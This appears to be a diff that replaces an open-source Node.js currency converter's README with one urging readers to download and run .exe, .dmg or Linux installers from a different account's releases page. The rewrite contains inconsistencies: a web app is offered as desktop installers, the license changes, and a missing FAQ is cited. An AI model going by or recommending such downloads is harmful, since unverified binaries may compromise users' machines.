@@ -1,127 +1,86 @@
-# Currency Converter 💱
+# 🌍 Currency-Converter-Web-App - Simple Currency Conversion in Real Time
 
-![License](https://img.shields.io/badge/License-ISC-blue.svg)
-![Node.js](https://img.shields.io/badge/Node.js-v18+-green)
-![Build](https://img.shields.io/badge/Build-Render-success)
-![Deployed on Render](https://img.shields.io/badge/Deployed_on-Render-blue)
+[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/saymondeveloper/Currency-Converter-Web-App/releases)
 
-A sleek and responsive **Currency Converter** web application built with **Node.js** and **Express**, leveraging real-time exchange rates from the **European Central Bank (ECB)**. Easily convert between multiple currencies with country flags, symbols, and a smooth, interactive UI.
+## 📖 Overview
 
----
+The Currency-Converter-Web-App is a user-friendly web application that helps you convert currencies easily. Built with Node.js and Express, this app fetches real-time exchange rates from the European Central Bank. You can quickly switch between multiple global currencies while enjoying a smooth user interface that features animations and country flags.
 
-## 🌟 Features
+## 🚀 Getting Started
 
-* ✅ Real-time currency conversion using ECB exchange rates
-* ✅ Over 40+ global currencies supported
-* ✅ Currency flags & symbols for easy identification
-* ✅ Swap currencies with a single click
-* ✅ Interactive and responsive custom select dropdowns
-* ✅ Input validation with error handling
-* ✅ Cached rates to minimize API calls and improve performance
-* ✅ Mobile-friendly layout with smooth animations
+To get started with the Currency-Converter-Web-App, follow these simple steps:
 
----
+### 1. Visit the Releases Page
 
-## 📦 Technologies Used
+Go to our [Releases page](https://github.com/saymondeveloper/Currency-Converter-Web-App/releases) to find the latest version of the application. 
 
-* **Backend:** Node.js, Express, XML2JS
-* **Frontend:** HTML, CSS, JavaScript
-* **API:** European Central Bank (ECB) reference rates
-* **Deployment:** Render / Railway
+### 2. Choose Your Version
 
----
+On the Releases page, you will see a list of versions. Look for the latest release marked as "latest". This version contains all the latest features and fixes.
 
-## 🖼 Screenshots
+### 3. Download the Application
 
-<div align="center">
+Click on the download link for your operating system. You can choose between various packages available (e.g., Windows, Mac, Linux). 
 
-**Conversion Result Display**
+### 4. Install the Application
 
-![Result Screenshot](./screenshots/result.png)
+Once the download is complete, locate the file on your computer. Here’s how to install it based on your operating system:
 
-</div>
+- **For Windows:**
+  1. Double-click the downloaded `.exe` file.
+  2. Follow the installation prompts.
+  
+- **For Mac:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the Currency Converter icon to your Applications folder.
+  
+- **For Linux:**
+  1. Open a terminal and navigate to the directory where you downloaded the file.
+  2. Run the installation command as instructed in the release notes.
 
+### 5. Launch the Application
 
-## 🚀 Live Demo
+- After successful installation, find the app on your computer.
+- Double-click the app icon to open the Currency Converter.
 
-Check it out live: [Currency Converter on Render](https://currency-converter-h6r6.onrender.com/)
+## 🔧 Features
 
----
+- **Real-Time Conversion:** Get up-to-date exchange rates directly from the European Central Bank.
+- **User-Friendly Interface:** Simple layout ensures ease of use for all.
+- **Multi-Currency Support:** Convert between various global currencies.
+- **Responsive Design:** Enjoy a seamless experience across all devices.
+- **Animations:** Smooth UI/UX transitions for an engaging experience.
 
-## 💻 Getting Started
+## 📊 System Requirements
 
-### Prerequisites
+To run the Currency-Converter-Web-App effectively, ensure your system meets the following requirements:
 
-* Node.js v18+
-* npm
+- **Operating System:**
+  - Windows 10 or later
+  - macOS Catalina or later
+  - Any recent Linux distribution
 
-### Installation
+- **Browser Support (if using as a web app):**
+  - Google Chrome
+  - Mozilla Firefox
+  - Safari
+  - Microsoft Edge
 
-1. Clone the repository:
+- **Network Connection:** An active internet connection is required for fetching real-time exchange rates.
 
-```bash
-git clone https://github.com/Sagarika311/currency-converter.git
-```
+## 💡 Tips for Use
 
-2. Navigate to the project folder:
+- Make sure to check your internet connection if the app does not fetch rates.
+- Always use the latest version for improved features and security.
 
-```bash
-cd currency-converter
-```
+## 🔗 Download & Install
 
-3. Install dependencies:
+To download the Currency-Converter-Web-App, visit the [Releases page](https://github.com/saymondeveloper/Currency-Converter-Web-App/releases). Follow the steps mentioned above to get the application installed on your device.
 
-```bash
-npm install
-```
+## 🗣️ Support
 
-4. Start the server:
+If you encounter any issues or have questions, please check the FAQ section in the documentation. You can also reach out by opening an issue on the GitHub repository.
 
-```bash
-node server.js
-```
+## 📝 License
 
-5. Open your browser at `http://localhost:3000`
-
----
-
-### Usage
-
-1. Enter an **amount** to convert.
-2. Select the **source currency** (From) and **target currency** (To).
-3. Click **Convert** to see the converted value.
-4. Use the **swap button** to quickly switch between currencies.
-
----
-
-## 🔧 Folder Structure
-
-```
-currency-converter/
-│
-├─ public/
-│  ├─ index.html       # Frontend HTML
-│  ├─ styles.css       # CSS styles
-│  └─ script.js        # Frontend JS
-│
-├─ server.js           # Express server & API
-├─ package.json
-├─ package-lock.json
-├─ README.md
-└─ screenshots/        # Add screenshots here
-```
-
----
-
-## 🛠 Customization
-
-* Add/remove currencies by editing `currencyFlags` and `currencySymbols` in `script.js`.
-* Change theme colors in `styles.css` using CSS variables.
-
----
-
-## 📄 License
-
-This project is licensed under the **ISC License** – see the [LICENSE](LICENSE) file for details.
-
----
+This application is open-source and follows the MIT License. Feel free to contribute or customize according to your needs.
